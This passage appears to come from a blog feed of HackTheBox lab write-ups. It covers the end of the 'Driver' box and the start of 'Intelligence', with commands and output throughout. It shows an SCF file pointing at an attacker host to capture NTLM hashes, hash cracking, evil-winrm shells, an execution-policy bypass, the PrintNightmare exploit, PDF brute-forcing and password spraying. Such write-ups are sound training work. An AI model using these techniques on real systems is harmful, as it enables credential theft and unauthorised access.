</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">&lt; Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">&lt; X-Powered-By: PHP/7.3.25
</span></span><span class="line"><span class="cl">&lt; WWW-Authenticate: Basic <span class="nv">realm</span><span class="o">=</span><span class="s2">&#34;MFP Firmware Update Center. Please enter password for admin&#34;</span>
</span></span><span class="line"><span class="cl">&lt; Date: Tue, <span class="m">19</span> Oct <span class="m">2021</span> 04:03:53 GMT
</span></span><span class="line"><span class="cl">&lt; Content-Length: <span class="m">20</span>
</span></span><span class="line"><span class="cl">&lt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 10.10.11.106 left intact</span>
</span></span><span class="line"><span class="cl">Invalid Credentials%
</span></span></code></pre></div><p>Surprisingly, <code>admin:admin</code> is a valid credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.12» 
</span></span><span class="line"><span class="cl">$ curl -u <span class="s1">&#39;admin:admin&#39;</span> -I 10.10.11.106 
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">Server: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.3.25
</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">19</span> Oct <span class="m">2021</span> 04:07:15 GMT
</span></span></code></pre></div><p>At the home page, it tells the purpose of this website. At the bottom, there&rsquo;s a potential username.</p>
<p><div class="img-container"><img src="imgs/image-20211019040903346.png" alt="image-20211019040903346"  /></div>
</p>
<p>On the Firmware Updates menu, there&rsquo;s an upload function.</p>
<p><div class="img-container"><img src="imgs/image-20211019041022554.png" alt="image-20211019041022554"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tony">Shell as tony</h3>
<h4 id="stealing-ntlm-response">Stealing NTLM Response</h4>
<p>The firmware updates page actually gives a hint, where it states that the uploaded file will be put into a file share. The file will also be reviewed by a testing team.</p>
<p><div class="img-container"><img src="imgs/image-20211020034608009.png" alt="image-20211020034608009"  /></div>
</p>
<p>The idea here is to steal the NTLM hash of the testing team.</p>
<p>My first attempt was putting an exe file by assuming the team would do some interaction like clicking on the file after it gets uploaded on the share. But nothing come back to my listener</p>
<p>And then I found <a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">this blog</a> and learned that an SCF (shell command file) can be used to trigger NTLM authentication without interaction with the file itself.</p>
<p>From here, I&rsquo;ll create an SCF file and upload it to the web. I&rsquo;ll start responder as well. Once the testing team visit the share folder, the explorer will try to resolve the network path looking for the icon.</p>
<p><code>iamf.scf</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[Shell]
</span></span><span class="line"><span class="cl">Command=2
</span></span><span class="line"><span class="cl">IconFile=\\10.10.14.11\iamf.ico
</span></span><span class="line"><span class="cl">[Taskbar]
</span></span><span class="line"><span class="cl">Command=ToggleDesktop
</span></span></code></pre></div><p>On my responder, it captures hash of user <code>tony</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «driver» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ sudo responder -w -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.10.11.106
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : DRIVER<span class="se">\t</span>ony
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : tony::DRIVER:718de
</span></span></code></pre></div><h4 id="hash-crack">Hash crack</h4>
<p>The password can easily be cracked with <code>hashcat</code> and <code>rockyou.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ hashcat -m <span class="m">5600</span> <span class="s1">&#39;tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:01...[SNIP]...&#39;</span> /c/tools/rockyou.txt --show
</span></span><span class="line"><span class="cl">tony::DRIVER:718de45096091894:2635472ECA8116616D85DF31C5271692:01...<span class="o">[</span>SNIP<span class="o">]</span>...:liltony
</span></span></code></pre></div><h4 id="winrm">WinRM</h4>
<p>The credentials can be used for remote access via WinRM</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.106 -u <span class="s1">&#39;tony&#39;</span> -p liltony
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; 
</span></span></code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
</span></span><span class="line"><span class="cl">----                -------------         ------ ----
</span></span><span class="line"><span class="cl">-ar---       10/19/2021   5:40 PM             <span class="m">34</span> user.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>esktop&gt; gc user.txt
</span></span><span class="line"><span class="cl">f04c7b...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as--administrator">Shell as  Administrator</h3>
<h4 id="printnightmare">PrintNightmare</h4>
<p>I quickly check if the spooler service is running because the box is named &ldquo;Driver&rdquo; and the website is all about printers. And It&rsquo;s!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\D</span>ocuments&gt; Get-Service -name spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  spooler            Print Spooler
</span></span></code></pre></div><p>At that time, the PrintNightmare vulnerability (CVE-2021-1675) is still a fresh thing, so it&rsquo;s worth to try.</p>
<p>First, I&rsquo;ll grab the <a href="https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1">PowerShell exploit module</a> from my machine</p>
<pre tabindex="0"><code>*Evil-WinRM* PS C:\users\tony\downloads&gt; wget 10.10.14.11:8000/CVE-2021-1675.ps1 -UseBasicParsing -outfile CVE-2021-1675.ps1
</code></pre><p>But during import, it fails.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">File C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads<span class="se">\C</span>VE-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID<span class="o">=</span>135170.
</span></span><span class="line"><span class="cl">At line:1 char:1
</span></span><span class="line"><span class="cl">+ Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span class="line"><span class="cl">    + CategoryInfo          : SecurityError: <span class="o">(</span>:<span class="o">)</span> <span class="o">[</span>Import-Module<span class="o">]</span>, PSSecurityException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
</span></span></code></pre></div><p>That&rsquo;s because the shell are get restricted. Fortunately, it is possible to bypass this restriction with the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force<span class="p">;</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Get-ExecutionPolicy
</span></span><span class="line"><span class="cl">Unrestricted
</span></span></code></pre></div><p>Now I can load the module and run the <code>Invoke-Nightmare</code> command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\t</span>ony<span class="se">\d</span>ownloads&gt; Invoke-Nightmare
</span></span></code></pre></div><p>The command creates a default local admin user <code>adm1n</code> and password of <code>P@ssw0rd</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.11» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.11.106 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\D</span>esktop<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> root.txt
</span></span><span class="line"><span class="cl">c1de502...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Intelligence</title>
      <link>https://fahmifj.github.io/hackthebox/intelligence/</link>
      <pubDate>Mon, 19 Sep 2022 01:01:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/intelligence/</guid>
      <description>Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts off by enumerating a website and run a brute-force attack against it to retrieve a bunch of PDF files, one of which contains a default password for new account. Spraying the password to a list of usernames gathered from the PDFs&amp;rsquo; metadata returns a valid combination. In the file shares, there&amp;rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Intelligence/">Intelligence</a> brings some cool enumeration and exploitation techniques to own Active Directory. It starts off by enumerating a website and run a brute-force attack against it to retrieve a bunch of PDF files, one of which contains a default password for new account. Spraying the password to a list of usernames gathered from the PDFs&rsquo; metadata returns a valid combination. In the file shares, there&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under <code>intelligence.htb</code>. By creating a new subdomain record, it is possible to capture the requester&rsquo;s hash where it can be cracked offline. Bloodhound reveals the user has permission to read GMSA account&rsquo;s password where the account has delegation permission to a service. These permissions can be abused for privilege escalation to domain admin.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>User enumeration via file metadata</li>
<li>ADI DNS attack</li>
<li>AD</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Impacket</li>
<li>BloodHound</li>
<li>dnstool.py</li>
<li>gMSADumper.py</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Port scanning with <code>nmap</code> reveals a bunch of ports open. Some interesting ports to dig into here are 445, 389, and 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49423,49667,49691,49709,49714 -sC -sV -oA nmap/10-tcp-allport-script-intelligence 10.10.10.248
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-14 00:22 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.248
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Intelligence
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-14 11:22:29Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">49423/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49709/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49714/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-14T11:23:25
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 104.01 seconds
</span></span></code></pre></div><p><code>Nmap</code> results also reveal the some domain names. I&rsquo;ll add these to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.248 dc.intelligence.htb intelligence.htb
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>When approaching an AD box, I would definitely check for anonymous login on SMB.</p>
<p>It&rsquo;s allowed but nothing to see here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.248/
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>On LDAP, I can only retrieve the naming contexts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -s base namingContexts
</span></span><span class="line"><span class="cl">dn:
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -b <span class="s2">&#34;dc=intelligence,dc=htb&#34;</span>
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The website hosted on this machine is a static site with no further information to dig in.</p>
<p><div class="img-container"><img src="imgs/image-20210714112254614.png" alt="image-20210714112254614"  /></div>
</p>
<p>In the next section, there are two download buttons.</p>
<p><div class="img-container"><img src="imgs/image-20210714112325301.png" alt="image-20210714112325301"  /></div>
</p>
<p>These buttons point to two PDF files. The file contents don&rsquo;t seem to be important, but in each document&rsquo;s properties there&rsquo;s a potential username.</p>
<p>PDF 1: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113015135.png" alt="image-20210714113015135"  /></div>
</p>
<p>PDF 2: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113121646.png" alt="image-20210714113121646"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-tifannymolina">Access as Tifanny.Molina</h3>
<h4 id="grabbing-more-pdfs">Grabbing more PDFs</h4>
<p>Seeing the filename with pattern <code>YYYY-MM-DD</code> eventually led me to think &ldquo;Will incrementing the date give me another pdf?&rdquo;.</p>
<p>The answer is yes, it does!</p>
<p><div class="img-container"><img src="imgs/image-20210716081606506.png" alt="image-20210716081606506"  /></div>
</p>
<p>From here, I&rsquo;ll write a script to brute-force the other PDFs with <code>YYYY-MM-DD</code> timestamp pattern.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> month in <span class="o">{</span>01..12<span class="o">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">do</span> 
</span></span><span class="line"><span class="cl">  <span class="k">for</span> day in <span class="o">{</span>01..31<span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">     wget -q <span class="s2">&#34;http://10.10.10.248/documents/2020-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl"> <span class="k">done</span>
</span></span></code></pre></div><p>And here&rsquo;s what I got.</p>
<p><div class="img-container"><img src="imgs/image-20210716083456661.png" alt="image-20210716083456661"  /></div>
</p>
<p>Alternatively, I can use <code>wget</code> with brace expansion:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget -q http://10.10.10.248/documents/2020-<span class="o">{</span>01..12<span class="o">}</span>-<span class="o">{</span>01..31<span class="o">}</span>-upload.pdf
</span></span></code></pre></div><h4 id="harvest-username-via-pdf-metadata">Harvest Username via PDF Metadata</h4>
<p>It&rsquo;s possible to harvest the creator name from the metadata to make a list of usernames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ exiftool * <span class="p">|</span> grep -i creator <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2 <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> tee ../users.list 
</span></span><span class="line"><span class="cl">Anita.Roberts
</span></span><span class="line"><span class="cl">Brian.Baker
</span></span><span class="line"><span class="cl">Brian.Morris
</span></span><span class="line"><span class="cl">Daniel.Shelton
</span></span><span class="line"><span class="cl">Danny.Matthews
</span></span><span class="line"><span class="cl">Darryl.Harris
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The first idea to come with the username list is to perform <a href="/hackthebox/forest/#asrep-roasting">AS-REP Roasting</a> attack. I&rsquo;ve tried it but no luck there.</p>
<h4 id="pdf-content-examination">PDF Content Examination</h4>
<p>I discovered two non-<em>Lorem Ipsum</em> files by manually examining the PDF contents.</p>
<p>The first one is <code>2020-06-04-upload.pdf</code>, it contains the default password for new accounts in Intelligence Corp.</p>
<p><div class="img-container"><img src="imgs/image-20210716090147601.png" alt="image-20210716090147601"  /></div>
</p>
<p>The second one is <code>2020-06-04-upload.pdf</code>, it contains some internal information that will be useful later.</p>
<p><div class="img-container"><img src="imgs/image-20210716084253574.png" alt="image-20210716084253574"  /></div>
</p>
<h4 id="password-spray">Password Spray</h4>
<p>From here, I can spray the password to the username list I have harvested earlier via <code>rpcclient</code>.  This attack returns one valid pair <code>Tiffany.Molina:NewIntelligenceCorpUser9876</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
